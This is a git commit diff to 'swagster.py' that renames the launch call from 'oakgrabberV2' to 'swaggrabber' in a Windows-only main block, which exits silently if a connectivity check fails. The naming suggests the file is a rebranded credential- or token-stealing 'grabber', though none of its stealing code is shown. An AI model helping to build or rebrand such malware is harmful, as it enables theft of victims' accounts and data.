57f217513a7fcfd8e14ec85e8098e05d015757f9
SWAGSTER <165525341+SWAGgrabber@users.noreply.github.com>
2024-03-31 07:16:00 +0700

    Update swagster.py

--- swagster.py
+++ swagster.py
@@ -1559,4 +1559,4 @@ if __name__ == "__main__" and os.name == "nt":
         requests.get('https://1.1.1.1')
     except:
         os._exit(0)
-    asyncio.run(oakgrabberV2().init())
+    asyncio.run(swaggrabber().init())
